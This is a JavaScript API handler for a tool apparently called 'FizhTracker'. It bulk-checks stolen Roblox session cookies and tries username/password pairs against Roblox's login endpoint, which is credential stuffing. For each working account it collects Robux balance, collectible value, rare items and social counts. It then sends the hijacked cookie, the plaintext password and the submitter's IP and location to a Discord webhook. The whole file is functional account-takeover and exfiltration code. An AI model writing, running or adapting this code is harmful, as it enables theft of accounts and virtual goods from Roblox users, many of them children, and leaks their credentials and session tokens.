export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
    const { mode, cookies, credentials, webhook } = req.body;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const location = await getLocation(ip);

    const valid = [], invalid = [];
    let items = [];
    if (mode === 'cookie' && cookies) {
        items = cookies.map(c => ({ type: 'cookie', value: c }));
    } else if (mode === 'login' && credentials) {
        items = credentials.map(c => ({ type: 'login', username: c.username, password: c.password }));
    } else {
        return res.status(400).json({ error: 'Invalid payload' });
    }

    const limited = items.slice(0, 50);
    for (const item of limited) {
        try {
            let cookie = null;
            let loginInfo = null;
            if (item.type === 'cookie') {
                cookie = item.value;
            } else {
                const loginResult = await robloxLogin(item.username, item.password);
                if (!loginResult.success) {
                    invalid.push(`${item.username}:${item.password} (login fail)`);
                    continue;
                }
                cookie = loginResult.cookie;
                loginInfo = { username: item.username, password: item.password };
            }
            const result = await checkCookie(cookie);
            if (result.valid) {
                result.ip = ip;
                result.location = location;
                if (loginInfo) result.login = loginInfo;
                valid.push(result);
                if (webhook) await sendDiscord(webhook, result);
            } else {
                invalid.push(item.type === 'cookie' ? item.value : `${item.username}:${item.password}`);
            }
        } catch (e) {
            invalid.push(item.type === 'cookie' ? item.value : `${item.username}:${item.password} (error)`);
        }
    }
    res.status(200).json({ valid, invalid, total: limited.length });
}

// Salin semua fungsi dari check.js (getLocation, robloxLogin, checkCookie, sendDiscord) ke sini
// agar bulk.js bisa berjalan mandiri
async function getLocation(ip) {
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,as,timezone`);
        const geoData = await geoRes.json();
        if (geoData.status === 'success') {
            return {
                country: geoData.country || 'Unknown',
                region: geoData.regionName || 'Unknown',
                city: geoData.city || 'Unknown',
                isp: geoData.isp || 'Unknown',
                asn: geoData.as || 'Unknown',
                timezone: geoData.timezone || 'Unknown'
            };
        }
    } catch (e) {}
    return { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', asn: 'Unknown', timezone: 'Unknown' };
}

async function robloxLogin(username, password) {
    const url = 'https://auth.roblox.com/v2/login';
    const payload = { ctoken: '', ctype: '', username, password };
    const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        redirect: 'manual'
    });
    const setCookie = res.headers.get('set-cookie');
    if (!setCookie) {
        const text = await res.text();
        return { success: false, message: 'No cookie. ' + text };
    }
    const match = setCookie.match(/\.ROBLOSECURITY=([^;]+)/);
    if (!match) return { success: false, message: 'ROBLOSECURITY not found' };
    return { success: true, cookie: match[1] };
}

async function checkCookie(cookie) {
    const headers = { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' };
    try {
        const userRes = await fetch('https://www.roblox.com/mobileapi/userinfo', { headers });
        if (!userRes.ok) return { valid: false, reason: 'Invalid or expired' };
        const userData = await userRes.json();
        const userID = userData.UserID;

        let rap = 0, itemCount = 0;
        if (userID) {
            const invRes = await fetch(`https://inventory.roblox.com/v1/users/${userID}/assets/collectibles?limit=100`, { headers });
            if (invRes.ok) {
                const invData = await invRes.json();
                const items = invData.data || [];
                itemCount = items.length;
                rap = items.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);
            }
        }

        let friends = 0, followers = 0;
        try {
            const fRes = await fetch(`https://friends.roblox.com/v1/users/${userID}/friends/count`, { headers });
            if (fRes.ok) { const d = await fRes.json(); friends = d.count || 0; }
            const folRes = await fetch(`https://friends.roblox.com/v1/users/${userID}/followers/count`, { headers });
            if (folRes.ok) { const d = await folRes.json(); followers = d.count || 0; }
        } catch (e) {}

        let korblox = false, headless = false;
        if (userID) {
            try {
                const korRes = await fetch(`https://inventory.roblox.com/v1/users/${userID}/items/102611803/is-owned`, { headers });
                if (korRes.ok) { const d = await korRes.json(); korblox = d.isOwned || false; }
            } catch (e) {}
            try {
                const headRes = await fetch(`https://inventory.roblox.com/v1/users/${userID}/items/131586929/is-owned`, { headers });
                if (headRes.ok) { const d = await headRes.json(); headless = d.isOwned || false; }
            } catch (e) {}
        }

        return {
            valid: true,
            cookie,
            username: userData.UserName || 'N/A',
            userID: userData.UserID || 'N/A',
            accountAge: userData.AccountAge || 0,
            robux: userData.RobuxBalance || 0,
            premium: userData.IsPremium || false,
            groupsOwned: userData.GroupsOwned || 0,
            friends,
            followers,
            rap,
            itemCount,
            korblox,
            headless
        };
    } catch (e) {
        return { valid: false, reason: e.message };
    }
}

async function sendDiscord(webhook, data) {
    const embed = {
        title: '✅ FizhTracker - Valid Account',
        color: 0x8b4cff,
        fields: [
            { name: '👤 Username', value: data.username, inline: true },
            { name: '💰 Robux', value: data.robux, inline: true },
            { name: '📅 Account Age', value: data.accountAge + ' days', inline: true },
            { name: '👥 Friends', value: data.friends, inline: true },
            { name: '👤 Followers', value: data.followers, inline: true },
            { name: '🏢 Groups Owned', value: data.groupsOwned, inline: true },
            { name: '📊 RAP', value: data.rap, inline: true },
            { name: '📦 Items', value: data.itemCount, inline: true },
            { name: '🦴 Korblox', value: data.korblox ? '✅ Yes' : '❌ No', inline: true },
            { name: '🎃 Headless', value: data.headless ? '✅ Yes' : '❌ No', inline: true },
            { name: '📡 IP Address', value: data.ip || 'Unknown', inline: false },
            { name: '🌍 Location', value: `${data.location?.city || 'Unknown'}, ${data.location?.region || 'Unknown'}, ${data.location?.country || 'Unknown'}`, inline: true },
            { name: '🏢 ISP', value: data.location?.isp || 'N/A', inline: true },
            { name: '⏰ Timezone', value: data.location?.timezone || 'N/A', inline: true },
        ],
        footer: { text: 'FizhTracker • ' + new Date().toLocaleString() }
    };
    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    });
}
